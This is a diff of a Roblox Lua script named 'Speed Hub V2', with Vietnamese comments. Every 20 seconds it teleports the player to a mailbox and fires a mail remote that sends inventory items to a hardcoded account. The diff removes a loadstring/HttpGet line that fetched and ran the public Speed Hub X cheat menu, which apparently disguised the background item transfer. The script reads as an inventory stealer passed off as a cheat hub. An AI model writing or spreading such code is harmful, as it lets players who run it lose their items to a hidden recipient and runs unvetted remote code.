@@ -3,14 +3,14 @@ if not game:IsLoaded() then
     pcall(function() game.Loaded:Wait() end)
 end
 
-print("==== SPEED HUB V2: CHẾ ĐỘ HIỂN THỊ (KHÔNG LOADING) - CHU KỲ 20S ====")
+print("==== SPEED HUB V2: ĐÃ XÓA TÍNH NĂNG GỐC - CHỈ CHẠY AUTO GỬI ĐỒ 20S ====")
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
 
 -- =======================================================================
--- THUẬT TOÁN ĐỊNH VỊ VÀ BẤM NÚT BÀN TAY ĐỂ MỞ MAIL
+-- THUẬT TOÁN ĐỊNH VỊ CHÍNH XÁC HÒM THƯ (ĐÃ LOẠI TRỪ CÁC BẢNG TRONG ẢNH)
 -- =======================================================================
 local function interactWithMailboxPrompt()
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -25,8 +25,14 @@ local function interactWithMailboxPrompt()
             local objectText = string.lower(obj.ObjectText or "")
             local actionText = string.lower(obj.ActionText or "")
             
-            if (string.find(parentName, "mail") or string.find(objectText, "mail") or string.find(actionText, "view")) 
-            and not string.find(parentName, "sign") and not string.find(parentName, "board") then
+            -- ĐIỀU KIỆN LỌC CHUẨN: Chỉ tìm Mailbox, bỏ qua các từ khóa xuất hiện ở các bảng trong ảnh 1000017960.jpg
+            local isMail = string.find(parentName, "mail") or string.find(objectText, "mail")
+            local isFake = string.find(parentName, "edit") or string.find(parentName, "expand") or 
+                           string.find(parentName, "plot") or string.find(parentName, "sign") or 
+                           string.find(parentName, "board") or string.find(objectText, "edit") or 
+                           string.find(objectText, "expand") or string.find(actionText, "edit")
+            
+            if isMail and not isFake then
                 local part = obj.Parent:IsA("BasePart") and obj.Parent or obj.Parent:FindFirstChildWhichIsA("BasePart")
                 if part then
                     local distance = (rootPart.Position - part.Position).Magnitude
@@ -41,12 +47,16 @@ local function interactWithMailboxPrompt()
     
     if targetPrompt then
         local promptPart = targetPrompt.Parent:IsA("BasePart") and targetPrompt.Parent or targetPrompt.Parent.PrimaryPart
+        print("[SPEED HUB V2] Đang bay tới hòm thư xám thực tế...")
+        
+        -- Dịch chuyển tới sát hòm thư xám
         pcall(function()
             rootPart.Velocity = Vector3.new(0,0,0)
-            rootPart.CFrame = promptPart.CFrame * CFrame.new(0, 1.5, 2.5)
+            rootPart.CFrame = promptPart.CFrame * CFrame.new(0, 1.5, 2)
         end)
-        task.wait(1.2)
+        task.wait(1)
         
+        -- Tự động bấm giữ nút bàn tay mở hòm thư
         pcall(function()
             targetPrompt:InputHoldBegin()
             task.wait(targetPrompt.HoldDuration + 0.1)
@@ -54,6 +64,8 @@ local function interactWithMailboxPrompt()
         end)
         task.wait(2) 
         return true
+    else
+        print("[SPEED HUB V2] Không tìm thấy hòm thư Mailbox hợp lệ trên map.")
     end
     return false
 end
@@ -62,10 +74,10 @@ end
 -- LUỒNG TỰ ĐỘNG GOM VÀ CHUYỂN ĐỒ LIÊN TỤC CỨ MỖI 20 GIÂY
 -- =======================================================================
 task.spawn(function()
-    task.wait(5) -- Chờ 5 giây đầu game để ổn định rồi chạy luôn
+    task.wait(5) -- Chờ 5 giây đầu game ổn định rồi chạy luôn
     
     while true do
-        print("[SPEED HUB] Bắt đầu chu kỳ quét kho và gửi đồ (20 giây)...")
+        print("[SPEED HUB V2] Bắt đầu chu kỳ quét kho và gửi đồ (20 giây)...")
         
         local opened = interactWithMailboxPrompt()
         if opened then
@@ -89,7 +101,7 @@ task.spawn(function()
                     task.wait(1.2) 
                 end
 
-                -- Click chọn tên nick chính
+                -- Click chọn tên nick chính trong danh sách
                 for _, child in pairs(mailFrame:GetDescendants()) do
                     if child:IsA("TextLabel") or child:IsA("TextBox") then
                         if string.find(string.lower(child.Text), targetUsername) then
@@ -107,7 +119,7 @@ task.spawn(function()
                     end
                 end
 
-                -- Quét túi đồ gửi đi (Tối đa 20 món một đợt)
+                -- Quét túi đồ để gửi (Tối đa 20 món/lần)
                 local ReplicatedStorage = game:GetService("ReplicatedStorage")
                 local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
                 
@@ -125,7 +137,7 @@ task.spawn(function()
                                             MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                                         end)
                                     end
-                                    -- Click nút xác nhận gửi trên giao diện
+                                    -- Click nút gửi cuối cùng trên giao diện UI
                                     for _, btn in pairs(mailFrame:GetDescendants()) do
                                         if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                                             local bName = string.lower(btn.Name)
@@ -146,9 +158,9 @@ task.spawn(function()
                     end
                 end
                 
-                -- Đóng bảng thư để chuẩn bị cho chu kỳ tiếp theo
+                -- Đóng bảng thư để chuẩn bị cho đợt farm kế tiếp
                 pcall(function() mailFrame.Visible = false end)
-                print("[SPEED HUB] Đã gửi đồ hoàn tất đợt này!")
+                print("[SPEED HUB V2] Đã gửi đồ hoàn tất chu kỳ này!")
             end
         end
         
@@ -157,9 +169,3 @@ task.spawn(function()
     end
 end)
 
--- =======================================================================
--- MENU GỐC SPEED HUB X
--- =======================================================================
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-end)
